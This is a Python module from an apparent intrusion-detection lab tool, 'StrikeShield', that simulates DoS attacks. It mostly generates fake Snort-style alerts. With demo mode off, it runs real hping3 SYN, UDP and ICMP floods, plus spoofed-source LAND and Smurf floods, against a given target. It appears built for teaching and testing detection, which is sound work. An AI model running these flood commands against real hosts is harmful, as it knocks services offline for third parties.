"""
StrikeShield - Attack Simulator
Simulates DDoS attacks using Hping3 for demonstration/lab purposes.
ONLY USE IN ISOLATED LAB ENVIRONMENTS.
"""

import subprocess
import threading
import time
import logging
import random
from datetime import datetime
from snort_parser import add_simulated_alert

logger = logging.getLogger(__name__)

_active_attacks: dict = {}
_attack_lock = threading.Lock()
_attack_history: list = []


ATTACK_PROFILES = {
    "syn_flood": {
        "name": "SYN Flood",
        "description": "TCP SYN flood targeting a port. Exhausts server connection table.",
        "cmd_template": ["hping3", "-S", "--flood", "-V", "-p", "{port}", "{target}"],
        "protocol": "TCP",
        "attack_type": "SYN Flood",
        "severity": "critical",
        "classification": "Attempted Denial of Service",
        "priority": 1,
    },
    "udp_flood": {
        "name": "UDP Flood",
        "description": "UDP packet flood. Saturates bandwidth and exhausts UDP listeners.",
        "cmd_template": ["hping3", "--udp", "-p", "{port}", "--flood", "{target}"],
        "protocol": "UDP",
        "attack_type": "UDP Flood",
        "severity": "critical",
        "classification": "Attempted Denial of Service",
        "priority": 1,
    },
    "icmp_flood": {
        "name": "ICMP Flood (Ping Flood)",
        "description": "ICMP Echo Request flood. Overwhelms target with ping packets.",
        "cmd_template": ["hping3", "-1", "--flood", "{target}"],
        "protocol": "ICMP",
        "attack_type": "ICMP Flood",
        "severity": "high",
        "classification": "Attempted Denial of Service",
        "priority": 2,
    },
    "land_attack": {
        "name": "LAND Attack",
        "description": "Sends packets with spoofed source=destination IP to cause infinite loop.",
        "cmd_template": ["hping3", "-S", "-a", "{target}", "-p", "{port}", "--flood", "{target}"],
        "protocol": "TCP",
        "attack_type": "LAND Attack",
        "severity": "high",
        "classification": "Attempted Denial of Service",
        "priority": 2,
    },
    "smurf_attack": {
        "name": "Smurf Attack",
        "description": "ICMP flood with spoofed source IP — amplified via broadcast.",
        "cmd_template": ["hping3", "-1", "--flood", "-a", "{target}", "{broadcast}"],
        "protocol": "ICMP",
        "attack_type": "Smurf Attack",
        "severity": "critical",
        "classification": "Attempted Denial of Service",
        "priority": 1,
    },
}

# Demo mode: simulate alerts without actually running hping3
DEMO_MODE = True

def set_demo_mode(enabled: bool):
    global DEMO_MODE
    DEMO_MODE = enabled
    logger.info(f"attack_simulator DEMO_MODE set to {DEMO_MODE}")

def _generate_fake_src_ip() -> str:
    return f"{random.randint(10,220)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"


def _simulate_attack_alerts(attack_id: str, profile: dict, target: str, port: int, duration: int, socketio=None, app=None):
    """Generate simulated alerts at a high rate to mimic a real attack."""
    start = time.time()
    src_ip = _generate_fake_src_ip()
    count = 0

    while time.time() - start < duration:
        with _attack_lock:
            if attack_id not in _active_attacks:
                break

        alert = {
            "timestamp": datetime.now().isoformat(),
            "message": f"STRIKESHIELD {profile['attack_type']} Detected",
            "classification": profile["classification"],
            "priority": profile["priority"],
            "src_ip": src_ip,
            "src_port": random.randint(1024, 65535),
            "dst_ip": target,
            "dst_port": port,
            "protocol": profile["protocol"],
            "attack_type": profile["attack_type"],
            "severity": profile["severity"],
        }
        add_simulated_alert(alert)

        count += 1
        time.sleep(0.15)  # ~6-7 alerts/sec for demo

    with _attack_lock:
        if attack_id in _active_attacks:
            _active_attacks[attack_id]["status"] = "completed"
            _active_attacks[attack_id]["packets_sent"] = count * 1000


def _run_hping3(attack_id: str, profile: dict, target: str, port: int, duration: int, socketio=None, app=None):
    """Actually run hping3 (non-demo mode). Requires hping3 installed + root."""
    cmd = [
        arg.format(target=target, port=port, broadcast="255.255.255.255")
        for arg in profile["cmd_template"]
    ]

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        with _attack_lock:
            _active_attacks[attack_id]["pid"] = proc.pid

        time.sleep(duration)
        proc.terminate()
        proc.wait(timeout=5)

        with _attack_lock:
            if attack_id in _active_attacks:
                _active_attacks[attack_id]["status"] = "completed"

    except FileNotFoundError:
        logger.error("hping3 not found. Falling back to demo mode.")
        _simulate_attack_alerts(attack_id, profile, target, port, duration, socketio, app)
    except Exception as e:
        logger.error(f"Attack failed: {e}")
        with _attack_lock:
            if attack_id in _active_attacks:
                _active_attacks[attack_id]["status"] = "error"


def start_attack(
    attack_type: str,
    target: str,
    port: int = 80,
    duration: int = 30,
    socketio=None,
    app=None,
) -> dict:
    """Launch a simulated attack in a background thread."""
    if attack_type not in ATTACK_PROFILES:
        return {"success": False, "error": f"Unknown attack type: {attack_type}"}

    profile = ATTACK_PROFILES[attack_type]
    attack_id = f"{attack_type}_{int(time.time())}"

    entry = {
        "id": attack_id,
        "attack_type": profile["attack_type"],
        "target": target,
        "port": port,
        "duration": duration,
        "started_at": datetime.now().isoformat(),
        "status": "running",
        "pid": None,
        "packets_sent": 0,
    }

    with _attack_lock:
        _active_attacks[attack_id] = entry
        _attack_history.append(entry)

    worker = _simulate_attack_alerts if DEMO_MODE else _run_hping3
    thread = threading.Thread(
        target=worker,
        args=(attack_id, profile, target, port, duration, socketio, app),
        daemon=True,
    )
    thread.start()

    logger.info(f"Attack started: {attack_id} -> {target}:{port} for {duration}s")
    return {"success": True, "attack_id": attack_id, "data": entry}


def stop_attack(attack_id: str) -> dict:
    """Stop an active attack."""
    with _attack_lock:
        if attack_id not in _active_attacks:
            return {"success": False, "error": "Attack not found"}
        attack = _active_attacks.pop(attack_id)

    pid = attack.get("pid")
    if pid and not DEMO_MODE:
        try:
            subprocess.run(["kill", str(pid)], capture_output=True)
        except Exception:
            pass

    return {"success": True, "message": f"Attack {attack_id} stopped"}


def stop_all_attacks() -> dict:
    with _attack_lock:
        ids = list(_active_attacks.keys())

    for aid in ids:
        stop_attack(aid)

    return {"success": True, "stopped": len(ids)}


def get_active_attacks() -> list:
    with _attack_lock:
        return list(_active_attacks.values())


def get_attack_history() -> list:
    return list(reversed(_attack_history[-50:]))


def get_attack_profiles() -> list:
    return [
        {
            "id": k,
            "name": v["name"],
            "description": v["description"],
            "protocol": v["protocol"],
            "severity": v["severity"],
        }
        for k, v in ATTACK_PROFILES.items()
    ]